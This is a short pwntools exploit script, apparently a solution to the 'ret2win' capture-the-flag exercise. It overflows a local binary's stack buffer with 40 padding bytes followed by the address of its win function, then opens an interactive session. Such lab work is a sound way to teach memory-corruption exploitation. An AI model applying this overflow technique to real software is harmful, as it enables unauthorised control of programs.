from pwn import *
from struct import pack

e = ELF('./ret2win')
address = int(hex(e.symbols['ret2win']), 16)
payload = b'A' * 40 + p32(address)
p = process("./ret2win", stdin=PTY)
p.write(payload)
p.interactive()

